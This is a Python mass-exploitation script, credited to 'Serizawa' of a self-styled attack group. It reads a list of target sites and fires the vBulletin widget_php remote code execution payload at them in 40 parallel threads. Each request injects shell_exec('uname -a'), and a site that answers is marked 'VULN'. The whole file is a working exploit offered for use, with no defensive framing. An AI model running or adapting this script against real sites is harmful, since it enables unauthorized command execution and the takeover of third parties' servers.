import urllib3, requests, os, sys, re, json
from requests.packages.urllib3.exceptions import InsecureRequestWarning
import base64
import random
import string
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
from multiprocessing.dummy import Pool as ThreadPool
from time import time as timer
from platform import system	
from colorama import Fore								
from colorama import Style								
from pprint import pprint								
from colorama import init
import urllib
from bs4 import BeautifulSoup

fr  =   Fore.RED											
fc  =   Fore.CYAN											
fw  =   Fore.WHITE											
fg  =   Fore.GREEN											
sd  =   Style.DIM											
sn  =   Style.NORMAL										
sb  =   Style.BRIGHT

params = {"routestring":"ajax/render/widget_php"}

try:
	os.system('clear')
	print("""
	|  | |  ||       ||       ||   | | ||       ||   _   ||  |  | ||       |
	|  |_|  ||____   ||    ___||   |_| ||    ___||  |_|  ||   |_| ||  _____|
	|       | ____|  ||   |___ |      _||   | __ |       ||       || |_____ 
	|       || ______||    ___||     |_ |   ||  ||       ||  _    ||_____  |
	 |     | | |_____ |   |___ |    _  ||   |_| ||   _   || | |   | _____| |
	  |___|  |_______||_______||___| |_||_______||__| |__||_|  |__||_______|

	  [ + ] Author : Serizawa

	[ + ] Familly Attack Cyber ~ Dann Kowalskyi [ + ]   
	  """)
	ganteng = input('ur files => ')
	f= open(ganteng, 'r') 
	woh = f.read().splitlines()
except IOError:
	pass
woh = list((woh))

def Domains(url):

	if '://' not in url:
		return "http://" + url
	else:
		return url
def vbulet(site):
	url = Domains(site)		
	
	try:
		cmd = 'uname -a'
		params["widgetConfig[code]"] = "echo shell_exec('"+cmd+"'); exit;"
		r = requests.post(url, data = params).text
		if 'Linux' in r:
			print ('{}[ {}VULN {}] {}{} --> {}' . format(fr,fg,fr,fg,url,r))
		else:
			print('{}[ {}NOT VULN {}] {}{} ' . format(fg,fr,fg,fr,url))
	except KeyboardInterrupt:
		sys.exit("\nClosing shell...")
	except Exception as e:
		print('{} --> {}' .format(kei,e))
		
def Run_Work(site):
	url = Domains(site)
	vbulet(url)

os.system('clear')
def Main():


	start = timer()
	pp = ThreadPool(40)
	pr = pp.map(Run_Work, woh)
	print('Time: ' + str(timer() - start) + ' seconds')


if __name__ == "__main__":
	Main()